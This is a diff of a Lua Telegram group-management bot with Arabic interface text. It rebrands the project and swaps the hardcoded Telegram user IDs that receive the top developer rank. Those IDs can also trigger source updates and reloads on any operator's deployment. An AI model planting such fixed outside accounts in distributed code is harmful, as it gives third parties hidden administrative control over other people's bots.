@@ -98,7 +98,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس ويزرد \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس الجحيم \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -115,7 +115,7 @@ local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
 ---------------------------------------------------------------------
-@r00t94
+@xb_0b
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -263,7 +263,7 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1078252131 or msg.sender_user_id_ == 1311827505 then 
+if msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1399282735 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
@@ -551,8 +551,8 @@ Adminn = true
 end	
 if Adminn then
 Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️",true)
-EditMsg(ChatID,dataid,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️")
+answerCallbackQuery(data.id_,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت",true)
+EditMsg(ChatID,dataid,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت")
 else
 answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
 end
@@ -597,19 +597,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1078252131 or msg.sender_user_id_ == 1311827505) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1399282735) then
 return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1078252131 or msg.sender_user_id_ == 1311827505) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1399282735) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1399282735 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1078252131 or msg.sender_user_id_ == 1311827505) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 or msg.sender_user_id_ == 1399282735) then
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
